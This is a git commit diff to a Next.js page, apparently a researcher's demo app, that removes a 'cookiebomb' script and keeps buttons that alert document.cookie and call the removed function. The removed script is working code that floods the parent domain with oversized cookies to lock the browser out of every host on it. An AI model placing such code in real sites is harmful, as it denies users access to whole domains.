9b88888696073c0a51a07b1011ee72ec8057cf84
m0chan <41368776+m0chan@users.noreply.github.com>
2022-04-04 16:36:55 +0100

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -12,18 +12,8 @@ export default function Home() {
 
       <main>
         <Header title="Welcome to my app! - m0chan" />
-    <script>
-        function cookiebomb(){
-                var d = document.domain.split(".").splice(-2).join(".");
-                var pollution = Array(4000).join('a');
-                for(var i=1;i<99;i++){
-                        document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
-                }
-                setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
-        }
-    </script>
-    <button onclick="alert(document.cookie)">Alert</button><br><br>
-    <button onclick="cookiebomb()">Cookie bomb</button><br><br>
+        <button onclick="alert(document.cookie)">Alert</button><br><br>
+        <button onclick="cookiebomb()">Cookie bomb</button><br><br>
         <p className="description">
           Get started by editing <code>pages/index.js</code>
         </p>
